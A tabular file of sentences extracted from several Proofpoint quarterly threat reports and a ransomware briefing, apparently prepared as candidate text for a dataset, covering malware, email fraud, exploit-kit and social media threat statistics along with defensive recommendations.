CAND_01640,R033,12,R033_P0001,R033_S000206,"This year, suspicious registrations outnumbered defensive ones 20-to-1."
CAND_01641,R033,12,R033_P0002,R033_S000209,brand-owned defensive registrations for Fortune 50 firms 0 500 1000 1500 2000 2500 3000 3500 1/1/16 2/1/16 3/1/16 4/1/16 5/1/16 6/1/16 7/1/16 8/1/16 Brand Owned Defense 2016 Suspicious Domains 2017 Brand Owned Defense 2017 Suspicious Domain 2016 TYPOSQUATTING Fraudsters register domains that are misspellings or typographically mangled versions of a legitimate domain to trick users who mistype the URL or don’t look closely at email headers.
CAND_01642,R033,13,R033_P0001,R033_S000210,Quarterly Threat Report | Q3 2017 13 SOCIAL MEDIA Trends Key stat: Fraudulent customer-support accounts doubled from the year-ago quarter.
CAND_01643,R033,13,R033_P0001,R033_S000216,Standard credential phishing through social media may be easier.
CAND_01644,R033,14,R033_P0001,R033_S000219,Quarterly Threat Report | Q3 2017 14 RECOMMENDATIONS This report provides insight into the shifting threat landscape that can inform your cybersecurity strategy.
CAND_01645,R033,14,R033_P0002,R033_S000225,Deploy email authentication to stop domain spoofing techniques used in email fraud.
CAND_01646,R033,14,R033_P0002,R033_S000227,"For email attacks that use lookalike domains, your solution should be able to find domains that could be mistaken for yours—and work with third-party services to take them down."
CAND_01647,R033,14,R033_P0002,R033_S000230,Robust protection includes robust analysis capabilities to preemptively identify and sandbox suspicious URLs and attachments.
CAND_01648,R033,14,R033_P0003,R033_S000237,Protect your brand from impostors on social media.
CAND_01649,R033,14,R033_P0003,R033_S000239,The solution should not just detect infringing accounts but work with takedown services to stop them from defrauding your customers and partners.
CAND_01650,R033,16,R033_P0001,R033_S000244,"Leading organizations of all sizes, including over 50 percent of the Fortune 100, rely on Proofpoint solutions, which are built for today’s mobile and social-enabled IT environments and leverage both the power of the cloud and a big-data-driven analytics platform to combat modern advanced threats."
CAND_01651,R034,2,R034_P0001,R034_S000003,"Every day, we analyze more than 5 billion email messages, hundreds of millions of social media posts, and more than 250 million malware samples to protect organizations around the world from advanced threats."
CAND_01652,R034,2,R034_P0001,R034_S000005,"That gives us a unique vantage point from which to reveal and analyze the tactics, tools, and targets of today’s cyber attacks."
CAND_01653,R034,2,R034_P0001,R034_S000006,"This report is designed to provide actionable intelligence you can use to better combat today’s attacks, anticipate emerging threats, and manage your security posture."
CAND_01654,R034,2,R034_P0001,R034_S000007,"Along with our findings, the report recommends steps you can take to protect your people, data, and brands."
CAND_01655,R034,3,R034_P0001,R034_S000013,7 Email fraud threats: Nobody is immune...............................................................................................................................................................
CAND_01656,R034,4,R034_P0003,R034_S000017,"Email • For the first time since Q2 2016, banking Trojans displaced ransomware as the top malware in email, accounting for almost 59% of all malicious email payloads in Q1."
CAND_01657,R034,4,R034_P0003,R034_S000019,"• The lull in ransomware and generally lower volumes of malicious mail in Q1 appear to be associated with a disruption in the Necurs botnet but have been accompanied by more diverse payloads including RATs, backdoors, and more."
CAND_01658,R034,4,R034_P0003,R034_S000023,• Roughly 95% of web-based attacks now redirect into social engineering schemes instead of EKs.
CAND_01659,R034,4,R034_P0003,R034_S000024,"• Proofpoint researchers played a key role in sinkholing EITest, the web’s oldest infection chain, preventing as many as two million malicious redirects a day."
CAND_01660,R034,4,R034_P0004,R034_S000025,"Social Media and Domain Research • Social media support fraud, or “angler phishing,” exploded in Q1 2018, increasing 200% from the previous quarter."
CAND_01661,R034,4,R034_P0004,R034_S000027,• 84% of Fortune 500 CEOs were victims of threats and hate speech on Twitter and the dark web in February 2018.
CAND_01662,R034,5,R034_P0001,R034_S000034,"February March January Indexed Daily Message Volume by Attack Type, Q1 2018 Figure 1: Indexed daily attack type trend, Q1 2018 URL Messages Attachment Messages The slowdown in TA505 activity allows us to more closely examine trends and payloads that might otherwise be drowned out by massive message volume from a single actor."
CAND_01663,R034,5,R034_P0002,R034_S000041,"Studying attackers’ tools, techniques and procedures helps us spot emerging threats and protect against them."
CAND_01664,R034,6,R034_P0002,R034_S000046,"Reduced ransomware volumes appeared to open the door for greater payload diversity, with remote access Trojans (RATs), keyloggers, and other types of malware filling the gap."
CAND_01665,R034,7,R034_P0001,R034_S000047,"7 Quarterly Threat Report | Q1 2018 Banking Trojans: Emotet leads bankers back to the fore Key stat: BANKING TROJANS accounted for 59% of all observed malicious messages, displacing ransomware for the first time since Q2 2016 as the top malware family by message volume."
CAND_01666,R034,7,R034_P0002,R034_S000055,"Indexed Relative Daily Message Volume With Banking Trojan Payloads Figure 4: Indexed relative daily banking Trojan message volume, Q1 2018 Panda Banker Emotet UrlZone Banker Ursnif GootKit The Trick Corebot Dridex Retefe Zloader February March January Ransomware: Down, but not out Key Stat: We detect hundreds of WannaCry samples every day."
CAND_01667,R034,7,R034_P0002,R034_S000059,"Figure 5 shows the relative volume of GandCrab, GlobeImposter, and Sigma ransomware, the only active ransomware strains observed in email in Q1."
CAND_01668,R034,7,R034_P0002,R034_S000060,"BANKING TROJANS This type of malware steals a victim’s bank login credentials, usually by redirecting the victim’s browser to a fake version of their bank’s website or injecting fake login forms into the real site."
CAND_01669,R034,7,R034_P0002,R034_S000061,"DRIDEX Dridex is a widely used banking Trojan that spreads through a variety of vectors, primarily via email, infecting the victims and stealing banking credentials."
CAND_01670,R034,8,R034_P0002,R034_S000072,It spread through a flaw in a file-sharing component of Microsoft Windows.
CAND_01671,R034,8,R034_P0002,R034_S000073,"We have observed continued WannaCry activity, suggesting that the ransomware never really went away."
CAND_01672,R034,9,R034_P0001,R034_S000075,EMAIL FRAUD continues to grow in both scale and pervasiveness.
CAND_01673,R034,9,R034_P0001,R034_S000083,the fourth quarter of 2017.
CAND_01674,R034,9,R034_P0001,R034_S000086,"The Netherlands was the lowest among observed countries, with nine attacks on average per targeted organization."
CAND_01675,R034,9,R034_P0001,R034_S000087,"For reference, targeted companies in the United States experienced 24 attacks in the quarter."
CAND_01676,R034,9,R034_P0001,R034_S000089,"In particular, entertainment and media, biotechnology, manufacturing, and transportation experienced increases of more than 50% in the average number of attacks per targeted organization compared to Q4 2017."
CAND_01677,R034,9,R034_P0001,R034_S000090,"Within our global customer base, real estate businesses saw the highest rate of email fraud attacks, with targeted organizations experiencing an average of 68 such attacks in Q1."
CAND_01678,R034,9,R034_P0001,R034_S000094,"Similarly, threat actors have increased the number of identities they routinely spoof."
CAND_01679,R034,10,R034_P0001,R034_S000104,10 Quarterly Threat Report | Q1 2018
CAND_01680,R034,10,R034_P0002,R034_S000108,Display-name spoofing attacks sent from webmail addresses accounted for 40% of all email fraud in Q1.
CAND_01681,R034,10,R034_P0002,R034_S000111,These are the cases in which an attacker spoofs a trusted identity within an organization to target someone from that same organization.
CAND_01682,R034,10,R034_P0002,R034_S000116,"Social engineering schemes rely on users encountering pop-ups and modal dialogs prompting them to install bogus software updates, fake antivirus, or special “font packs.” Instead of requiring active exploits that have increasingly short shelf lives, these schemes trick users into installing malware themselves."
CAND_01683,R034,10,R034_P0002,R034_S000117,As many as 95% of web-based attacks now redirect users to social engineering templates rather than EKs.
CAND_01684,R034,10,R034_P0002,R034_S000121,DOMAIN SPOOFING Spoofing impersonates trusted colleagues or contacts by making an attacker’s emails appear to come from a legitimate and expected address.
CAND_01685,R034,10,R034_P0002,R034_S000123,"EXPLOIT KITS (EKS) Exploit kits (EKs) run on the web, detecting and exploiting vulnerabilities in computers that connect to it."
CAND_01686,R034,10,R034_P0002,R034_S000127,WHY WE TRACK THIS
CAND_01687,R034,11,R034_P0001,R034_S000129,"The final payloads or destinations in these events ranged from phishing schemes to coin miners, demonstrating the breadth of threats in web-based attacks, even as EK traffic continues to decline."
CAND_01688,R034,11,R034_P0001,R034_S000130,Figure 8: Sample of events leading to social engineering schemes and EKs Exploit kit activity was variable throughout Q1 but dropped 71% compared to the previous quarter.
CAND_01689,R034,12,R034_P0001,R034_S000136,"We also discovered a new Fast Flux infrastructure, dubbed Sandiflux, used to spread malware and conceal malicious activity on the web, notably GandCrab ransomware."
CAND_01690,R034,13,R034_P0001,R034_S000145,"Since Q1 2017, we have observed a more than fivefold increase in this type of attack, which is much more difficult for social platforms to address in an automated fashion than standard link spam."
CAND_01691,R034,13,R034_P0001,R034_S000146,"At the same time, social media is a breeding ground for a variety of hate speech and threats against organizations and their staff."
CAND_01692,R034,13,R034_P0001,R034_S000147,Some 84% of Fortune 500 CEOs were victims of threats and hate speech on Twitter and the dark web in February 2018.
CAND_01693,R034,13,R034_P0001,R034_S000150,"For example, 30% of Bitcoin-related domain registrations in Q1 were suspicious, but new registrations fell off sharply as the value of Bitcoin continued to fall through Q1."
CAND_01694,R034,13,R034_P0001,R034_S000153,Some 84% of Fortune 500 CEOs were victims of threats and hate speech on Twitter and the dark web in February 2018.
CAND_01695,R034,14,R034_P0001,R034_S000163,"Preventing email fraud requires a multilayered solution that includes email authentication and domain discovery, as well as dynamic classification that can analyze the content and context of emails, stopping display-name and lookalike-domain spoofing at the email gateway."
CAND_01696,R034,16,R034_P0001,R034_S000170,"Proofpoint helps cybersecurity professionals protect their users from the advanced attacks that target them (via email, mobile apps, and social media), protect the critical information people create, and equip their teams with the right intelligence and tools to respond quickly when things go wrong."
CAND_01697,R034,16,R034_P0001,R034_S000172,"©Proofpoint, Inc."
CAND_01698,R034,16,R034_P0001,R034_S000174,in the United States and other countries.
CAND_01699,R034,16,R034_P0001,R034_S000175,All other trademarks contained herein are property of their respective owners.
CAND_01700,R034,16,R034_P0001,R034_S000176,"proofpoint.com 0518-021 For the latest threat research and guidance about today’s advanced threats and digital risks, visit proofpoint.com/us/threat-insight"
CAND_01701,R035,2,R035_P0001,R035_S000003,"Every day, we analyze more than 1 billion email messages, hundreds of millions of social media posts, and more than 150 million malware samples to protect organizations around the world from advanced threats."
CAND_01702,R035,4,R035_P0002,R035_S000010,Here are the key takeaways from the fourth quarter of 2017.
CAND_01703,R035,4,R035_P0003,R035_S000013,RANSOMWARE remained the top payload distributed by malicious messages.
CAND_01704,R035,4,R035_P0003,R035_S000015,The number of ransomware payment demands denominated in Bitcoin fell 73% amid wide swings in the CRYPTOCURRENCY’s value.
CAND_01705,R035,4,R035_P0003,R035_S000021,"EXPLOIT KITS AND WEB-BASED ATTACKS Social engineering techniques grew as browser exploits fell among high-profile, web-based attack campaigns."
CAND_01706,R035,4,R035_P0004,R035_S000028,"RANSOMWARE This type of malware locks away victims’ data by encrypting it, then demands a “ransom” to unlock it with a decryption key."
CAND_01707,R035,4,R035_P0004,R035_S000029,"CRYPTOCURRENCY A form of digital money designed to be secure and anonymous, making it well suited for ransomware payments that cannot be traced to the attacker."
CAND_01708,R035,4,R035_P0004,R035_S000030,"THE TRICK The Trick, also known as TrickBot, is a banking Trojan closely related to Dyre."
CAND_01709,R035,4,R035_P0004,R035_S000033,"EXPLOIT KIT Exploit kits (EKs) run on the web, detecting and exploiting vulnerabilities in computers that connect to compromised sites, malicious ads, and attacker-controlled landing pages."
CAND_01710,R035,5,R035_P0001,R035_S000042,"October November December Indexed Daily Malicious Message Volume by Attack Type, Q4 2017 Figure 1: Indexed attack type trend, October 2017 through December 2017 (77 Days) Document Attachment URL Archive Attachment Conversely, malicious URL use plummeted—the exceptionally high volumes of the third quarter proved to be an anomaly."
CAND_01711,R035,5,R035_P0001,R035_S000044,"Figure 1 shows dramatic swings in the volume of malicious messages that use malicious URLs, document attachments, and archive file attachments (such as ZIP or 7-Zip)."
CAND_01712,R035,5,R035_P0001,R035_S000045,These constant shifts highlight attackers’ flexibility.
CAND_01713,R035,5,R035_P0001,R035_S000046,"They continually vary attack types, payloads, and infection techniques to grow more effective and get the biggest returns."
CAND_01714,R035,5,R035_P0002,R035_S000047,"TA505 Motivated by financial gain, this threat actor is the source of some of the largest email attack campaigns on record, including those spreading the Dridex banking Trojan, Locky ransomware, Jaff ransomware, The Trick banking Trojan, and more."
CAND_01715,R035,5,R035_P0002,R035_S000049,"For most of 2016 and several months in 2017, Locky accounted for the majority of malicious email traffic."
CAND_01716,R035,5,R035_P0002,R035_S000051,"Initially used in small regional campaigns, GlobeImpostor became a global threat when the prolific threat actor TA505 began using it in larger campaigns."
CAND_01717,R035,6,R035_P0001,R035_S000053,The Trick extended its run as the top banking Trojan by global message volume.
CAND_01718,R035,6,R035_P0001,R035_S000055,"This is a far cry from 2016, when Dridex and Vawtrak were the top bankers and The Trick was limited to mostly small, geo-targeted campaigns."
CAND_01719,R035,6,R035_P0001,R035_S000060,"In past years, the autumn months have seen more variation in targeting by banking Trojans."
CAND_01720,R035,6,R035_P0001,R035_S000066,Despite a surge in banking Trojan message volume—largely driven by large campaigns by a single attacker using The Trick—ransomware remained the dominant malicious payload in email campaigns.
CAND_01721,R035,6,R035_P0001,R035_S000068,"Ransomware Other Banking Stealer Downloader Malware by Category, Q4 2017 Figure 2: Share of global malicious message volume by malware family, Q4 2017 57% 35% 4% 3% 1% For much of the last two years, attackers’ ransoms have been denominated in Bitcoin values."
CAND_01722,R035,6,R035_P0001,R035_S000070,"Coin miners are malware strains that hijack infected systems for this purpose, generating cryptocurrency for the threat actor distributing the malware."
CAND_01723,R035,6,R035_P0001,R035_S000071,WEBINJECT A technique that alters web pages as they are displayed to the users.
CAND_01724,R035,7,R035_P0001,R035_S000076,Quarterly Threat Report | Q4 2017 7 Surging cryptocurrency values are a boon for holders of Bitcoin.
CAND_01725,R035,7,R035_P0001,R035_S000079,Sigma ransomware first appeared in mid-November demanding a payment denominated in U.S.
CAND_01726,R035,7,R035_P0002,R035_S000084,"Ransomware Ransoms Denominated in Bitcoin vs Traditional Currency, 90-Day Trend Figure 3: Ransomware ransoms denominated in Bitcoin vs."
CAND_01727,R035,7,R035_P0002,R035_S000086,Economics would suggest that the latter actually causes the former.
CAND_01728,R035,7,R035_P0002,R035_S000087,This trend may reverse if Bitcoin prices fall back to earth.
CAND_01729,R035,7,R035_P0002,R035_S000088,"No matter what happens, the correlation is more evidence of modern cybercriminals’ profit motive."
CAND_01730,R035,8,R035_P0001,R035_S000096,Our research suggests that threat actors are dramatically outpacing brands in the registration of suspicious domains vs.
CAND_01731,R035,8,R035_P0001,R035_S000097,defensive registrations.
CAND_01732,R035,8,R035_P0001,R035_S000103,"While some observers pay more attention to fraudulent registrations in new or unusual top-level domains (TLDs), suspicious registrations in the standard “.com” remain by far the most common."
CAND_01733,R035,8,R035_P0001,R035_S000106,Figure 4 highlights common spelling patterns in suspicious domain registrations.
CAND_01734,R035,8,R035_P0001,R035_S000108,Figure 5 breaks out specific letter swaps.
CAND_01735,R035,9,R035_P0001,R035_S000112,Quarterly Threat Report | Q4 2017 9 Web-based threats: Consolidation and social engineering Key stat: Observed exploit kit traffic decreased 31% from Q3.
CAND_01736,R035,9,R035_P0001,R035_S000114,The RIG EK accounted for almost 98% of observed exploit kit traffic in Q4 2017.
CAND_01737,R035,9,R035_P0001,R035_S000117,"Instead of exploiting technical flaws in user’s web browser, the attacks tricked people into installing malware themselves."
CAND_01738,R035,9,R035_P0001,R035_S000119,Targeted users were presented with a webpage asking them to download an update to their browser or Adobe Flash.
CAND_01739,R035,9,R035_P0001,R035_S000122,"As foreshadowed by early examples in late 2016, they have turned to social engineering-based approaches similar to those used in email attacks—often to great effect."
CAND_01740,R035,10,R035_P0001,R035_S000127,Quarterly Threat Report | Q4 2017 10 Social media threats surge into 2018 Key stat: Fraudulent customer support accounts on social media grew 30% over the previous quarter and year-ago totals.
CAND_01741,R035,10,R035_P0001,R035_S000130,"After remaining flat for most of 2017, phishing links in social media also showed strong growth in Q4, jumping nearly 70% over Q3 (Figure 8)."
CAND_01742,R035,10,R035_P0002,R035_S000132,"fraudulent support accounts # of Support Fraud Accounts Observed (Right Axis) Linear Linear # of Phishing Links per Month (Left Axis) 0 10 20 30 40 50 60 70 0 500 1000 1500 2000 2500 3000 3500 Jun-17 Jul-17 Aug-17 Sep-17 Oct-17 Nov-17 Dec-17 POINT-OF-SALE MALWARE HAS ITS UPS AND DOWNS POS-Related Signature Activity—Daily 1/1/2017 to 11/24/2017 Figure 7: Point of sale (POS) malware traffic, January-November 2017 Jan 1 Feb 1 Mar 1 Apr 1 May 1 Jun 1 Jul 1 Aug 1 Sep 1 Oct 1 Nov 1 Dec 1 FastPOS FindPOS FrameworkPOS JackPOS, Alina POS, ProjectHookPOS LockPOS MagikPOS NewPosThings PunkeyPOS, vSkimmer ZeusPOS In 2016, we saw traffic associated with specific point-of-sale (POS) malware strains quadruple over the Black Friday weekend."
CAND_01743,R035,10,R035_P0002,R035_S000133,"In 2017, spikes were less pronounced."
CAND_01744,R035,10,R035_P0002,R035_S000134,"A mix of top POS malware strains were active at various times over the year, not just around Black Friday (see Figure 7)."
CAND_01745,R035,10,R035_P0002,R035_S000136,"That was around the same time MagikPOS slowed, suggesting a single actor switched tools."
CAND_01746,R035,10,R035_P0002,R035_S000139,"We can speculate that wider chip- and-PIN implementations are making a dent in POS malware, reducing the potential success of seasonal campaigns that lead to spikes in traffic."
CAND_01747,R035,11,R035_P0001,R035_S000145,Leverage a solution that identifies and quarantines both inbound email threats targeting employees and outbound threats targeting customers before they reach the inbox.
CAND_01748,R035,11,R035_P0001,R035_S000147,"Highly-targeted, low volume email fraud scams often have no payload at all and are thus difficult to detect."
CAND_01749,R035,12,R035_P0001,R035_S000155,"ABOUT PROOFPOINT Proofpoint, Inc."
CAND_01750,R035,12,R035_P0001,R035_S000163,www.proofpoint.com 1217-033
CAND_01751,R036,1,R036_P0002,R036_S000003,"Financially motivated threat actors that gain initial access via email are no longer using static, predictable attack chains, but rather dynamic, rapidly changing techniques."
CAND_01752,R036,1,R036_P0002,R036_S000006,The changes began rolling out in 2022.
CAND_01753,R036,1,R036_P0002,R036_S000007,"Based on Proofpoint’s unique telemetry analyzing billions of messages per day, Proofpoint researchers have observed widespread threat actor experimentation in malware payload delivery, using old filetypes, unexpected attack chains, and a variety of techniques that result in malware infections, including ransomware."
CAND_01754,R036,2,R036_P0001,R036_S000017,CRIME FINDS A WAY: THE EVOLUTION AND EXPERIMENTATION OF THE CYBERCRIME ECOSYSTEM | THREAT REPORT
CAND_01755,R036,2,R036_P0002,R036_S000018,"2 In this report, Proofpoint will examine major landscape shifts and common tactics, techniques, and procedures (TTPs) adopted by a variety of threat actors."
CAND_01756,R036,2,R036_P0002,R036_S000020,"For this report, a campaign is defined as a timebound set of related threat activity analyzed by Proofpoint researchers."
CAND_01757,R036,2,R036_P0002,R036_S000024,"All instances of research in this report, including case studies, refer to proprietary Proofpoint processes and data unless otherwise noted."
CAND_01758,R036,2,R036_P0002,R036_S000032,"In 2022, the total number of campaigns using macros of either kind dropped nearly 66%, and so far in 2023, macros have barely made an appearance in campaign data."
CAND_01759,R036,3,R036_P0002,R036_S000036,"3 Proofpoint’s reporting in July 2022 highlighted the new ways threat actors were adopting to the shift away from macros, including using archive files such as ISO attachments to deliver malware."
CAND_01760,R036,3,R036_P0002,R036_S000040,"For example, Proofpoint observed LNK attachments used by at least eight large ecrime threat actors considered IABs, with their use peaking in June and September 2022 before the actors began pivoting to new TTPs."
CAND_01761,R036,3,R036_P0003,R036_S000041,Figure: Use of shortcut (LNK) files by priority ecrime threat actors.
CAND_01762,R036,3,R036_P0003,R036_S000042,"Initially Proofpoint researchers hypothesized that threat actors would begin using XLL files as part of the overall TTP experimentation following macros, as this technique, while not popular, had been previously observed in threat data."
CAND_01763,R036,3,R036_P0003,R036_S000044,"Proofpoint has observed at least six large ecrime actors experiment with XLL files in malware delivery, and multiple unattributed threat clusters, but XLL files are used significantly less than other filetypes and have not experienced a notable uptick in use across the threat landscape."
CAND_01764,R036,4,R036_P0002,R036_S000049,4 threat actors began using shortcuts in campaigns before its popularity decreased earlier this year in favor of other filetypes in attack chains.
CAND_01765,R036,4,R036_P0002,R036_S000052,"The HTML smuggling technique ""smuggles"" an encoded script within an HTML attachment."
CAND_01766,R036,4,R036_P0003,R036_S000058,"Typically, threat actors have used PDF files that include a URL to start the attack chain."
CAND_01767,R036,4,R036_P0003,R036_S000059,"As part of the recent threat actor TTP experimentation, Proofpoint researchers began to observe PDF attachments increasingly used by multiple cybercrime threat actors including IABs."
CAND_01768,R036,5,R036_P0002,R036_S000062,"5 smuggling, Proofpoint began to see multiple IAB threat actors use PDF files starting in December 2022."
CAND_01769,R036,5,R036_P0002,R036_S000066,"Of note, Proofpoint researchers uncovered a high-volume campaign in April 2023 where TA570 likely was experimenting with PDF encryption."
CAND_01770,R036,6,R036_P0002,R036_S000073,6
CAND_01771,R036,7,R036_P0003,R036_S000085,"Within a few months, as detailed in the following diagram, there were over 120 campaigns leveraging OneNote files."
CAND_01772,R036,7,R036_P0003,R036_S000087,TA577 used
CAND_01773,R036,8,R036_P0002,R036_S000090,"Comparatively, TA542 started using OneNote files much later in campaigns, in March 2023."
CAND_01774,R036,8,R036_P0003,R036_S000091,Figure: Number of OneNote campaigns observed by threat researchers between December 2022 and March 2023.
CAND_01775,R036,8,R036_P0003,R036_S000093,Threat actors frequently included a series of embedded fields hidden behind the button to increase the likelihood of a successful user click.
CAND_01776,R036,8,R036_P0003,R036_S000101,"Once a technique becomes well-known, it becomes less effective, thereby forcing threat actors to try something different."
CAND_01777,R036,8,R036_P0003,R036_S000103,"While Proofpoint still observes OneNote documents as part of malware attack chains, the technique has been used significantly less since March 2023."
CAND_01778,R036,8,R036_P0003,R036_S000105,"Additionally, Microsoft announced in March 2023 that OneNote will block embedded files with dangerous extensions."
CAND_01779,R036,8,R036_P0003,R036_S000107,0 10 20 30 40 50 60 70 80 Dec-22 Jan-23 Feb-23 Mar-23 Number of Campaigns Date Number of OneNote Campaigns Over Time TA542 TA551 TA570 TA577 TA581 Unattributed
CAND_01780,R036,9,R036_P0002,R036_S000110,Ransomware and other malware operators often buy access from independent cybercriminal groups who infiltrate major targets and then sell access to the ransomware actors for a profit.
CAND_01781,R036,9,R036_P0003,R036_S000119,"In the following months, TA570 demonstrated multiple new and different TTPs, using as many as six different and unique attack chains in one month, and using or experimenting with numerous filetypes throughout."
CAND_01782,R036,10,R036_P0002,R036_S000123,"In many campaigns, multiple different filetypes are used such as LNKs within VHDs."
CAND_01783,R036,10,R036_P0002,R036_S000130,"In April 2022, TA577 continued to use Excel documents for malware delivery, and used a mix of the EtterSilent maldoc builder and MSI files before adopting shortcuts in May 2022."
CAND_01784,R036,10,R036_P0002,R036_S000131,TA577 typically delivers Qbot but has also been observed delivering IcedID and Ursnif since 2021.
CAND_01785,R036,10,R036_P0002,R036_S000132,"Since May 2022, TA577 demonstrated multiple new and different TTPs, using as many as nine different, unique attack chains in one month."
CAND_01786,R036,10,R036_P0002,R036_S000135,"In many campaigns, multiple filetypes are used, such as including shortcut files within ISOs."
CAND_01787,R036,11,R036_P0002,R036_S000137,11
CAND_01788,R036,12,R036_P0001,R036_S000142,CRIME FINDS A WAY: THE EVOLUTION AND EXPERIMENTATION OF THE CYBERCRIME ECOSYSTEM | THREAT REPORT
CAND_01789,R036,12,R036_P0002,R036_S000144,"TA577 is among the most active cybercriminal threat actors tracked by Proofpoint with dynamic, frequently changing attack chains."
CAND_01790,R036,12,R036_P0002,R036_S000146,"Both threat actors, in addition to other initial access brokers, appear to have the pulse of the threat landscape and know when and why specific attack chains stop being effective, and will quickly create new methods to bypass detections and attempt to increase the effectiveness and likelihood of victim engagement with their payload delivery."
CAND_01791,R036,12,R036_P0002,R036_S000149,"Prior to 2022, threat actors delivering IcedID largely used macros to deliver malware, in addition to occasionally other methods such as URLs leading to zipped JavaScript payloads."
CAND_01792,R036,12,R036_P0002,R036_S000150,"But threat actors distributing IcedID, led by TA578 and unattributed threat clusters, began experimenting with new mechanisms for payload delivery starting in early 2022."
CAND_01793,R036,14,R036_P0002,R036_S000170,"TA558 also has remained consistent with their targeting which is mainly Portuguese and Spanish speakers, typically located in the Latin America region, with additional targeting observed in Western Europe and North America."
CAND_01794,R036,14,R036_P0002,R036_S000173,"The group initially sent macro-laden Microsoft Word attachments that downloaded remote access trojan (RAT) payloads but quickly pivoted to malware delivery via URLs, typically using cloud services such as Google Drive and Discord, leading to various scripts and compressed executables."
CAND_01795,R036,14,R036_P0003,R036_S000178,in their VBS file names.
CAND_01796,R036,14,R036_P0003,R036_S000179,"While other threat clusters have used similar attack chains such as URLs to VBS files, TA2541 has been one of the most consistent with their email lures, VBS file names, and infection chain."
CAND_01797,R036,14,R036_P0003,R036_S000182,The group uses Spanish- language lures to distribute a known – but infrequently used – RAT called Bandook.
CAND_01798,R036,15,R036_P0002,R036_S000187,15 The actor has used the same TTPs since Proofpoint first began tracking it in 2021.
CAND_01799,R036,15,R036_P0002,R036_S000188,"While TA2721 has remained consistent overtime, more threat actors including IABs, as described above, began using the PDF to embedded URL technique for malware delivery with increasing frequency over the last year."
CAND_01800,R036,15,R036_P0002,R036_S000195,"Proofpoint anticipates threat actors will continue to experiment with new methods of payload delivery, and while many cybercriminals use the same TTPs for weeks or months at a time, it is unlikely there will be a single attack chain or series of techniques that remain consistent or have the same staying power as macro-enabled attachments once had."
CAND_01801,R037,1,R037_P0001,R037_S000002,“Universal Health Services Estimates $67 Million in Ransomware Losses.” March 2021.
CAND_01802,R037,1,R037_P0001,R037_S000004,“University of California SF pays ransomware hackers $1.14 million to salvage research.” June 2020.
CAND_01803,R037,1,R037_P0001,R037_S000006,“Cognizant expects to lose between $50m and $70m following ransomware attack.” May 2020.
CAND_01804,R037,1,R037_P0001,R037_S000007,"Description: Ransomware encrypts critical data or locks users out of their devices until they pay a ransom to the attacker, typically a crime syndicate."
CAND_01805,R037,1,R037_P0001,R037_S000008,"Tools of the trade: Cryptolocker, WannaCry, Bad Rabbit, Cerber, Crysis, CryptoWall, GoldenEye, Jigsaw, Locky, Petya, Conti, Sodinokibi and Ryuk Origin: 1989, AIDS Trojan created by Joseph Popp."
CAND_01806,R037,1,R037_P0001,R037_S000009,"Popp sent 20,000 infected diskettes labeled “AIDS Information— Introductory Diskettes” to attendees of the World Health Organization’s international AIDS conference and created what is now believed to be the world’s first ransomware attack."
CAND_01807,R037,1,R037_P0001,R037_S000014,Risk factors: • Vulnerable software and systems • No easily accessible backups • Ineffective or nonexistent cybersecurity • Untrained and vulnerable users Possible damages: • Monetary loss • Loss of sensitive or proprietary data • Potential reputational harm • Operational disruption and productivity loss Ransomware—which gets its name from the payment it demands after locking away victims’ files—is a major issue for all modern businesses.
CAND_01808,R037,1,R037_P0001,R037_S000015,"It’s one of today’s most disruptive types of cyber attacks, putting victims out of business, forcing hospitals to turn away patients, and bringing entire city governments to a standstill."
CAND_01809,R037,1,R037_P0001,R037_S000020,Administrators quickly attempted to isolate the infection and ringfence a number of systems that prevented the ransomware from traveling to the core UCSF network and causing further damage.2 Cognizant earnings hit with $50M–$70M ransomware costs IT services provider Cognizant was hit with a ransomware attack in April 2020 that hit its Q2 earnings.
CAND_01810,R037,1,R037_P0001,R037_S000021,"The incident incurred legal, consulting and other costs to investigate the incident, restore service and remediate systems.3 Fast Facts"
CAND_01811,R037,2,R037_P0001,R037_S000024,"officials say originated in Russia.6 In a news release, the company said it detected the attack on its computer networks in North America and Australia."
CAND_01812,R037,2,R037_P0001,R037_S000025,"Fortunately, its backup servers were not affected.7 4 David E."
CAND_01813,R037,2,R037_P0001,R037_S000026,"Sanger, Clifford Krauss and Nicole Perlroth (The New York Times)."
CAND_01814,R037,2,R037_P0001,R037_S000027,“Cyberattack Forces a Shutdown of a Top U.S.
CAND_01815,R037,2,R037_P0001,R037_S000028,Pipeline.” May 2021.
CAND_01816,R037,2,R037_P0001,R037_S000029,5 Collin Eaton and Dustin Volz (The Wall Street Journal).
CAND_01817,R037,2,R037_P0001,R037_S000030,“Colonial Pipeline CEO Tells Why He Paid Hackers a $4.4 Million Ransom.” May 2021.
CAND_01818,R037,2,R037_P0001,R037_S000032,“Meat Buyers Scramble After Cyberattack Hobbles JBS.” June 2021.
CAND_01819,R037,2,R037_P0001,R037_S000034,"“JBS, world’s largest meat processor, shut down U.S."
CAND_01820,R037,2,R037_P0001,R037_S000036,"Anatomy of a Ransomware Attack For over three decades, ransomware has evolved into one of the most menacing cyber threats."
CAND_01821,R037,2,R037_P0001,R037_S000037,Digital currency like Bitcoin have made it easy for cyber criminals to collect ransoms.
CAND_01822,R037,2,R037_P0001,R037_S000039,Here is how most ransomware attacks play out: Cyber criminals are also learning that most victims of ransomware have data backup and refuse to entertain their ransom demands.
CAND_01823,R037,2,R037_P0001,R037_S000041,They start with stealing and encrypting files and move on to threatening to release the stolen data.
CAND_01824,R037,2,R037_P0001,R037_S000043,"Sophisticated ransomware strains even seek out and encrypt backups, too."
CAND_01825,R037,2,R037_P0001,R037_S000044,5.
CAND_01826,R037,2,R037_P0001,R037_S000047,Scanning and Encryption | The malware then scans the system and the network and encrypts files.
CAND_01827,R037,2,R037_P0001,R037_S000050,2.
CAND_01828,R037,2,R037_P0001,R037_S000055,5 1 2 3 4
CAND_01829,R037,3,R037_P0001,R037_S000056,RANSOMWARE | THREAT BRIEFING 3 Research Insights Ransomware is commonly delivered as a secondary infection after a system is first compromised through a malicious email.
CAND_01830,R037,3,R037_P0001,R037_S000058,Here is a list of common malware strains and ransomware mostly closely associated with them.
CAND_01831,R037,3,R037_P0001,R037_S000059,"Emotet, The Trick, Dridex and Qbot were among the most prolific malware we saw in 2020, with steady volumes across the year and significant spikes in the fall."
CAND_01832,R037,3,R037_P0001,R037_S000063,While 41 % of Spanish organizations refused to pay the ransom after being infected.
CAND_01833,R037,3,R037_P0001,R037_S000065,"Upon paying a one-time ransom, 78% of French organizations were able to regain access to their data."
CAND_01834,R037,3,R037_P0001,R037_S000066,The U.S.
CAND_01835,R037,3,R037_P0001,R037_S000067,was the second highest at 76%.
